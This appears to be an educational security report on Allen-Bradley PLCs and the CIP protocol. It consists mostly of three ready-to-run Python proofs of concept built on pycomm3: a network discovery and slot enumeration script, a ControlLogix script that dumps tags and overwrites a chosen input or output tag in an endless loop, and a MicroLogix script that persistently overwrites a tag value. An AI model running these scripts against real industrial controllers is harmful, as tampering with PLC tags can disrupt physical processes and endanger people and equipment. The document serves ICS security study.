
Before reading, make sure you are familiar with ICS components and their correlated acronyms. Please reference the [ICS Overview](../ICS%20Overview.md) for an introduction.

## TL;DR
---

- Allen-Bradley PLCs communicate over the **Common Industrial Protocol (CIP)**.
	- This protocol is an open standard supported by the Open DeviceNet Vendors Association. (ODVA).

- Allen-Bradley produces a handful of distinct PLC families, but this report will only cover the two families we encountered and tested.
	- **MicroLogix:** the more cost-effective, compact, and simpler lineup of PLCs
	- **ControlLogix:** the higher-end, more powerful, and more scalable lineup of PLCs

<div style="page-break-after: always;"></div>

- Three PoC's were developed using the ``pycomm3`` Python library -- one for general Allen-Bradley PLC enumeration and two for reading and writing data (one for the ``MicroLogix`` models and one for the ``ControlLogix`` models).

	1.  The **Allen-Bradley Enumeration PoC** simply performs an open network broadcast to return a list of all available Allen-Bradley based devices (to include HMI's).  This PoC also attempts to detect and return information of all utilized PLC slots on a specified target.

	2. The **Allen-Bradley ControlLogix Read/Write PoC** extracts the current running configuration of a specified ControlLogix PLC. The attacker then inputs the target "tag" (or a local variable) from the returned configuration, and the specified tag is then continuously overwritten via an infinite loop to achieve a desired effect.

	3. The **Allen-Bradley MicroLogix Read/Write PoC** reads the current value of a specified "tag" (or a local variable) on a target MicroLogix PLC, and prompts the user for the new value to send and overwrite. This PoC demonstrates a more sophisticated attack on the PLC's internal logic is possible. 

- ``pycomm3`` Library Documentation:  https://docs.pycomm3.dev/en/latest/

## Allen-Bradley Overview
---
>[!context]
>This note stems from a personal report written during an educational investigation into ICS infrastructure.

We began our ICS investigation with packet analysis of Allen-Bradley communications. This led us to CIP, and subsequently the ``pycomm3`` Python library for our PoCs.

### Common Industrial Protocol (CIP)
---
The **Common Industrial Protocol (CIP)** is a protocol used in industrial automation and control systems, and is the primary protocol we discovered being used by Allen-Bradley devices.  It is not an open, documented standard like some other industrial communication protocols such as Modbus or OPC (OLE for Process Control).  Instead, CIP is associated with the EtherNet/IP protocol, which is one of the protocol variants under the CIP umbrella.

CIP is an application layer protocol managed by **ODVA (Open DeviceNet Vendor Association)**, a consortium of industrial automation companies. While ODVA provides some level of documentation and specifications for EtherNet/IP and CIP, it is not considered an entirely open and freely available standard in the same way that some other protocols are.

Once the ``pycomm3`` library was found, focus was shifted to PoC development over packet analysis.


### Allen-Bradley Enumeration PoC
---

The following **Allen-Bradley Enumeration PoC** simply performs an open network broadcast to return a list of all available/reachable Allen-Bradley based devices (to include both PLC's and HMI's).  After returning information on all available Allen-Bradley devices, the PoC prompts the user to enumerate the slots on a specified device.  Once input, it attempts to automatically detect and return information of all utilized PLC slots on the specified target.


**Install Dependencies:**
```python
pip install pycomm3
```


**Proof-of-Concept:**
```python
from pycomm3 import CIPDriver
import sys

# Discovery
print("[+] Discovering available hosts on the network...")
discovery_data = CIPDriver.discover()

# Visual Formatting of Data
for i in discovery_data:
  formatted_str = "\n".join([f"{key}: {value}" for key, value in i.items()])
  print("\n" + formatted_str)
  
# Attempting to Open connection...
ip = input("\n[+] Input IP to Enumerate: ")

try:
  cipObj = CIPDriver(ip)
  connected = cipObj.open()
  print("[+] Connection successful.")
except:
  print("[-] Connection unsuccessful.")
  sys.exit()
  
# List all slot information
print("[+] Attempting to print slot data...")
 
# Determine amount of slots available on target
for i in range(10,-1,-1):
  try:
    cipObj.get_module_info(i)
    total_slots = i
    break
      
  except:
    total_slots = None
    continue
 
# View Data in all available Slots
if total_slots is None:
  print("[-] Unable to determine PLC slot quantity.")

else:
  for i in range(0,(total_slots + 1)):
    print("\n[+] Slot: " + str(i))
    ugly_slot_data = cipObj.get_module_info(i)
    slot_string = "\n".join([f"{key}: {value}" for key, value in ugly_slot_data.items()])
    print(slot_string)
```


### Allen-Bradley ControlLogix Read/Write PoC
---

The **Allen-Bradley ControlLogix Read/Write PoC** extracts the current running configuration of a specified ControlLogix PLC. The attacker then inputs the target "tag" (or a local variable) from the returned configuration, and the specified tag is then continuously overwritten with a value via an infinite loop to achieve a desired effect.

- The continuous loop is required because the overwritten value is volatile, and returns to the original value immediately after the writing is complete.


**Install Dependencies:**
```python
pip install pycomm3
```


**Proof-of-Concept:**
```python
from pycomm3 import LogixDriver
import sys

# Target information
print("[+] Allen-Bradley ControlLogix")
ip = input(" o  Input IP: ")

# Connect and Acquire Existing Variable names
try: 
  obj = LogixDriver(ip)
  connected = obj.open()
except:
  print("[-] Connection failed.")
  sys.exit()

obj.get_tag_list()

print("\n[+] Listing Available Tags:")
print(" o  Tags containing 'I' are for input.")
print(" o  Tags containing 'O' are for ouptut.")
print(" o  Tags containing 'C' are for error handling.\n")

for tag in obj.tags:
  print(tag)

tag = input("\n[+] Input Target Tag: ")

# Constantly Write Data to an Existing Variable
print("\n[+] Writing constant data to '" + tag + "'...")

# Write to "Input" variable
if 'I' in tag:
  while True:
    obj.write(tag, {'Fault':0, 'Data': 1})
    
# Write to "Output" variable
elif 'O' in tag:
  while True:
    obj.write(tag,{'Data', 1})

# Unsupported tag
elif "C" in tag:
  print("[-] 'C' tag currently not supported.")

else:
  print("[-] Invalid tag.")
```

### Allen-Bradley MicroLogix Read/Write PoC
---

The **Allen-Bradley MicroLogix Read/Write PoC** reads a the current value of specified "tag" (or a local variable) on a target MicroLogix PLC, then prompts the user for the new value to send and overwrite. This PoC demonstrates a more sophisticated attack on the PLC's internal logic is possible.

- Unlike the **ControlLogix Read/Write PoC**, the value set here is not volatile.  Meaning once the value is sent to the PLC, the value is written and remains.

- This PoC received the least amount of time, so it is the least robust and requires more development.


**Install Dependencies:**
```python
pip install pycomm3
```


**Proof-of-Concept:**
```python
from pycomm3 import SLCDriver
import sys

# Target information
print("[+] Allen-Bradley MicroLogix")
ip = input(" o  Input IP: ")

### Hardcoded Tags because SLCDriver does not support tag dumping:
# outputs = O0:0
# Inputs = I1:0
# Status = S2:0
# Binary = B3:0
# Timer = T4:0
# Counter = C5:0
# Control = R6:0
# Integer = N7:0
# Float = F8:0
# Custom Types = N 10+

# Example tag being used
tag = 'N7:0'

# Attempt Connection
try:
  obj = SLCDriver(ip)
  obj.open()
except:
  print("[-] Connection failed.")
  sys.exit()

# Read Current Value
first_int = obj.read(tag)
print(f"\n[+] Value before the Write: '{first_int}'")

value = input("[+] Input new integer value to set: ")

# Write Next Value
obj.write([tag,int(value)])
first_int = obj.read(tag)
print(f"[+] Value after the Write: '{first_int}'")
```



